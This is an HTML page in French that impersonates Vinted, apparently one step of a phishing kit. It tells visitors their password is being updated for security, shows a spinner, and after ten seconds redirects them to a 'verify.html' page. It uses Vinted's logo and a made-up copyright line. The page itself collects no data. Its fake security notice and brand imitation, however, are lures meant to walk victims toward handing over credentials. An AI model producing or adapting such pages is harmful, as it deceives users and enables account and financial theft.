<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vinted - Mise à jour en cours</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }
        .container {
            background-color: #ffffff;
            width: 90%;
            max-width: 600px;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            text-align: center;
            margin: 15px auto;
            box-sizing: border-box;
            max-height: calc(100vh - 30px);
            overflow-y: auto;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            max-width: 140px;
            height: auto;
            border: 0;
        }
        .green-text { /* Classe pour le texte vert, comme le logo */
            color: #007b76;
            font-weight: 700;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #007b76;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .section-text {
            font-size: 0.95em;
            line-height: 1.5;
            margin-bottom: 15px;
            color: #444; /* Texte noir/gris */
        }
        .bottom-text { /* Classe pour le texte en bas */
            margin-top: 20px;
        }
        footer {
            text-align: center;
            padding: 10px 0;
            color: #777;
            font-size: 0.8em;
            width: 100%;
            margin-top: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
        </div>
        <p class="section-text green-text">
            Veuillez patienter pendant que nous mettons à jour votre mot de passe pour sécuriser votre compte.
        </p>
        <div class="spinner"></div>
        <p class="section-text bottom-text">
            Mise à jour de sécurité en cours...
        </p>
    </div>

    <footer>
        <p>&copy; 2025 Vinted - La mode d'occasion, repensée.</p>
    </footer>

    <script>
        // Redirige vers la page de vérification après 10 secondes
        setTimeout(function() {
            window.location.href = 'verify.html';
        }, 10000); // 10000 millisecondes = 10 secondes
    </script>
</body>
</html>
